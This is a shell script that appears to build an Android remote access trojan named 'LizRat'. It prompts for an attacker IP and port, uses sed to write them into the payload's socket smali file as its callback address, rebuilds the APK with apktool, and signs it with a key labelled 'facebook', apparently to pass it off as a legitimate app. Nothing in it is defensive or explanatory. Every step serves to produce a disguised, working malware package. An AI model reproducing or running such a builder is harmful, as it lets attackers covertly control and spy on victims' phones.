#!/usr/bin/env sh

RED='\033[0;31m'
GRN='\033[0;32m'
SAF='\033[38;5;202m'
WIT='\033[37m'
NC='\033[0m'

echo "${SAF}	╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╭╮╱╱╭╮        "
echo "${SAF}	┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮┃╭╮┃╱╱╱╱┃┃╱╱┃┃        "
echo "${WIT}	┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯┃╰╯╰┳╮╭┳┫┃╭━╯┣━━┳━╮   "
echo "${WIT}	┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱┃╭━╮┃┃┃┣┫┃┃╭╮┃┃━┫╭╯   "
echo "${WIT}	┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮┃╰━╯┃╰╯┃┃╰┫╰╯┃┃━┫┃    "
echo "${GRN}	╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━━┻━━┻┻━┻━━┻━━┻╯    "
echo "${GRN}                            BY LUCIFER       "

smaliFile="smali/com/Liz0rd/lizrat/IOSocket.smali"

if [ -d $PREFIX/opt/lizrat ]; then

    appPath="$PREFIX/opt/lizrat/payload"
fi

read -p "🅴🅽🆃🅴🆁 🆈🅾🆄🆁 🅸🅿   :" host
read -p "🅴🅽🆃🅴🆁 🆈🅾🆄🆁 🅿🅾🆁🆃:" port


sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

clear

echo "${SAF}	╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╭╮╱╱╭╮        "
echo "${SAF}	┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮┃╭╮┃╱╱╱╱┃┃╱╱┃┃        "
echo "${WIT}	┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯┃╰╯╰┳╮╭┳┫┃╭━╯┣━━┳━╮   "
echo "${WIT}	┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱┃╭━╮┃┃┃┣┫┃┃╭╮┃┃━┫╭╯   "
echo "${WIT}	┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮┃╰━╯┃╰╯┃┃╰┫╰╯┃┃━┫┃    "
echo "${GRN}	╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━━┻━━┻┻━┻━━┻━━┻╯    "
echo "${GRN}                            BY LUCIFER       "
echo "${SAF}[*]Building Payload${NC}"
sleep 5

apktool b "$appPath" -o $HOME/lizrat_output/lizrat_unsigned.apk
clear
cd $HOME/lizrat_output

clear

echo "${SAF}	╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╭╮╱╱╭╮        "
echo "${SAF}	┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮┃╭╮┃╱╱╱╱┃┃╱╱┃┃        "
echo "${WIT}	┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯┃╰╯╰┳╮╭┳┫┃╭━╯┣━━┳━╮   "
echo "${WIT}	┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱┃╭━╮┃┃┃┣┫┃┃╭╮┃┃━┫╭╯   "
echo "${WIT}	┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮┃╰━╯┃╰╯┃┃╰┫╰╯┃┃━┫┃    "
echo "${GRN}	╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━━┻━━┻┻━┻━━┻━━┻╯    "
echo "${GRN}                            BY LUCIFER       "

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key${NC}"
sleep 5

keytool -genkeypair -alias facebook -keyalg RSA -keysize 2048 -validity 10000 -keystore key.jks -storepass lucifer -dname "CN=facebook, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown"
clear

echo "${SAF}	╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╭╮╱╱╭╮        "
echo "${SAF}	┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮┃╭╮┃╱╱╱╱┃┃╱╱┃┃        "
echo "${WIT}	┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯┃╰╯╰┳╮╭┳┫┃╭━╯┣━━┳━╮   "
echo "${WIT}	┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱┃╭━╮┃┃┃┣┫┃┃╭╮┃┃━┫╭╯   "
echo "${WIT}	┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮┃╰━╯┃╰╯┃┃╰┫╰╯┃┃━┫┃    "
echo "${GRN}	╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━━┻━━┻┻━┻━━┻━━┻╯    "
echo "${GRN}                            BY LUCIFER       "

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload${NC}"
sleep 5

zipalign -v 4 lizrat_unsigned.apk lizrat_zipaligned.apk
clear

echo "${SAF}	╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╭╮╱╱╭╮        "
echo "${SAF}	┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮┃╭╮┃╱╱╱╱┃┃╱╱┃┃        "
echo "${WIT}	┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯┃╰╯╰┳╮╭┳┫┃╭━╯┣━━┳━╮   "
echo "${WIT}	┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱┃╭━╮┃┃┃┣┫┃┃╭╮┃┃━┫╭╯   "
echo "${WIT}	┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮┃╰━╯┃╰╯┃┃╰┫╰╯┃┃━┫┃    "
echo "${GRN}	╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━━┻━━┻┻━┻━━┻━━┻╯    "
echo "${GRN}                            BY LUCIFER       "

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload : Done${NC}"
echo "${WIT}[*]Signing the Payload${NC}"
sleep 5

apksigner sign --ks key.jks --ks-key-alias facebook --ks-pass pass:lucifer --out lizrat_signed.apk lizrat_zipaligned.apk
clear

echo "${SAF}	╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╭╮╱╱╭╮        "
echo "${SAF}	┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮┃╭╮┃╱╱╱╱┃┃╱╱┃┃        "
echo "${WIT}	┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯┃╰╯╰┳╮╭┳┫┃╭━╯┣━━┳━╮   "
echo "${WIT}	┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱┃╭━╮┃┃┃┣┫┃┃╭╮┃┃━┫╭╯   "
echo "${WIT}	┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮┃╰━╯┃╰╯┃┃╰┫╰╯┃┃━┫┃    "
echo "${GRN}	╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━━┻━━┻┻━┻━━┻━━┻╯    "
echo "${GRN}                            BY LUCIFER       "

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload : Done${NC}"
echo "${WIT}[*]Signing the Payload : done${NC}"
echo "${WIT}[*]Removing Junk files${NC}"
sleep 5

rm lizrat_signed.apk.idsig key.jks lizrat_unsigned.apk lizrat_zipaligned.apk 
clear

echo "${SAF}	╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╭╮╱╱╭╮        "
echo "${SAF}	┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮┃╭╮┃╱╱╱╱┃┃╱╱┃┃        "
echo "${WIT}	┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯┃╰╯╰┳╮╭┳┫┃╭━╯┣━━┳━╮   "
echo "${WIT}	┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱┃╭━╮┃┃┃┣┫┃┃╭╮┃┃━┫╭╯   "
echo "${WIT}	┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮┃╰━╯┃╰╯┃┃╰┫╰╯┃┃━┫┃    "
echo "${GRN}	╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━━┻━━┻┻━┻━━┻━━┻╯    "
echo "${GRN}                            BY LUCIFER       "

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload : Done${NC}"
echo "${WIT}[*]Signing the Payload : Done${NC}"
echo "${WIT}[*]Removing Junk files : Done${NC}"
echo "${GRN}[*]DONE! LizRat_Signed built success${NC}"
echo "${GRN}[*]It can be found under HOME/lizrat_output Directory${NC}"
